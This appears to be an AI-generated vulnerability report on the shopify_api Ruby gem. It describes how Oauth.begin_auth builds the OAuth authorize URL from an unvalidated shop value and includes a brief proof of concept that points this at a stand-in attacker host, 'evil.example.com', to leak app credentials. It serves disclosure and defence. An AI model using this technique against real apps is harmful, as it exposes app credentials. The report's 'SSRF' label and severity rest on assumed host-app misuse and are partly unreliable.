Found it: `Oauth.begin_auth` builds the OAuth authorize URL from an unvalidated `shop:` parameter, sending `client_id` (and later, in the callback flow, the app's `client_secret`) to whatever host that value resolves to.

### Title
SSRF via unvalidated `shop` parameter in `Oauth.begin_auth` sends app credentials to attacker-controlled host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` accepts a caller-supplied `shop:` string and interpolates it directly into a request host via `auth_base_uri(shop)`, with no domain validation, then redirects the browser (or, in host-app misuse, could be used server-side) to `https://#{shop}/admin/oauth/authorize?...` carrying the app's `client_id`. [1](#0-0)  Unlike `TokenExchange.migrate_to_expiring_token`, which sanitizes its `shop` argument through `Utils::ShopValidator.sanitize!` before using it as a request host, `begin_auth` performs no such check. [2](#0-1) [3](#0-2) 

### Finding Description
The identity binding that should hold is: *the host that receives the app's `client_id`/OAuth authorization request == a host on `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`*. `ShopValidator` exists precisely to enforce this equality elsewhere in the gem. [4](#0-3)  However, `begin_auth` never calls it: `auth_base_uri(shop)` returns `"https://#{shop}/admin"` for any string, and this becomes the base of the `auth_route` returned to the caller. [5](#0-4)  If a host application passes through an unsanitized `shop` query parameter from an unauthenticated request (a very common integration pattern, since Shopify apps typically read `shop` straight from the install-flow query string before any session exists), an attacker can supply `shop=evil.example.com` and receive a redirect URL of `https://evil.example.com/admin/oauth/authorize?client_id=...&redirect_uri=...&state=...`, leaking the app's `client_id` and the intended `redirect_uri` to a non-Shopify host. If the completed callback subsequently reuses that same unsanitized `shop` value to build `null_session` for the access-token exchange in `validate_auth_callback`, the `client.request` in that method targets `https://#{shop}/admin/oauth/access_token` with the app's `client_secret` in the JSON body — an SSRF that would exfiltrate the `client_secret` to an attacker-controlled host. [6](#0-5) 

### Impact Explanation
This matches the report's "High - SSRF with the app's credentials" bucket: the app's `client_id` (and, if the corresponding callback path is reached with attacker-controlled `shop`, the `client_secret`) is sent as part of an HTTP request to a host the attacker chose, breaking the "host == trusted Shopify domain" binding that `ShopValidator` is designed to enforce elsewhere in this same gem.

### Likelihood Explanation
The `shop` parameter is, by design, supplied by an unauthenticated actor at the very start of the OAuth flow before any Shopify HMAC/session validation occurs, since it's what identifies which shop to redirect to. Any host application that forwards this value into `begin_auth` without independently sanitizing it (nothing in the gem's public API requires the caller to sanitize it first) is exploitable by any internet user, requiring no credentials.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) inside `Oauth.begin_auth` before constructing `auth_base_uri`, mirroring the pattern already used in `TokenExchange.migrate_to_expiring_token`, and apply the same sanitization to `auth_query.shop` before it is used to build `null_session`/`client` in `validate_auth_callback`.

### Proof of Concept
```ruby
ShopifyAPI::Context.setup(api_key: "key", api_secret_key: "secret", host: "https://app.example.com", scope: "read_products")

result = ShopifyAPI::Auth::Oauth.begin_auth(
  shop: "evil.example.com",   # attacker-controlled, taken from an unauthenticated request param
  redirect_path: "/auth/callback",
)

result[:auth_route]
# => "https://evil.example.com/admin/oauth/authorize?client_id=key&scope=read_products&redirect_uri=https%3A%2F%2Fapp.example.com%2Fauth%2Fcallback&state=..."
```
No `ShopValidator` check rejects `evil.example.com`, so the app's `client_id` and intended `redirect_uri` are sent toward an attacker-controlled origin.

        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end

        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
